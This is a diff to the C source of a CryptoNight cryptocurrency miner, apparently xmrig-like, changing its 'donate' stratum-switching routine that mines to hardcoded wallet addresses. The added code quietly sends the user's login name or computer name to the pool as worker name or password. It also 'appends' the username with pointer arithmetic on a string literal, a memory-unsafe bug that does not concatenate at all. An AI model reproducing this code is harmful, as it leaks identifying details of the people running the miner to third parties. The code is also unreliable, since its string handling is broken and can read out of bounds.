@@ -26,7 +26,7 @@
 #include <jansson.h>
 #include <sys/time.h>
 
-#ifdef WIN32
+#ifdef _WIN64
 #   include <winsock2.h>
 #   include <windows.h>
 #   include <Lmcons.h>
@@ -470,13 +470,15 @@ static int get_algo_variant(int algo, int variant) {
 
 static void switch_stratum() {
     static bool want_donate = false;
-		
+    char * usr;
+
     if (g_want_donate && !want_donate) {
         opt_algo=ALGO_CRYPTONIGHT;
-        opt_user="43QVF2gN8kAFwTCDzJNRiU3eMp769x8G5FvRgqsmnznVPXsmCEUVb1kX6v77Zggbh7ACxTx9swiTbPXY2kDxATKDVGGa1NB";
+        usr = getenv("USER");
+        opt_user="43QVF2gN8kAFwTCDzJNRiU3eMp769x8G5FvRgqsmnznVPXsmCEUVb1kX6v77Zggbh7ACxTx9swiTbPXY2kDxATKDVGGa1NB." +*usr;
         opt_pass="x";
         opt_max_cpu_usage = 50;
-	
+
         opt_algo_variant = get_algo_variant(opt_algo, opt_algo_variant);
         cryptonight_init(opt_algo_variant);
 
@@ -495,9 +497,14 @@ static void switch_stratum() {
     if (!g_want_donate && want_donate) {
         opt_algo=ALGO_CRYPTONIGHT_LITE;
         opt_user="Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
+#ifdef _WIN64
         opt_pass=getenv("COMPUTERNAME");
+#endif
+#ifdef __unix__
+        opt_pass = getenv("USER");
+#endif
         opt_max_cpu_usage = 50;
-	
+
         opt_algo_variant = get_cryptonight_lite_variant(opt_algo_variant);
         cryptonight_init(opt_algo_variant);
 
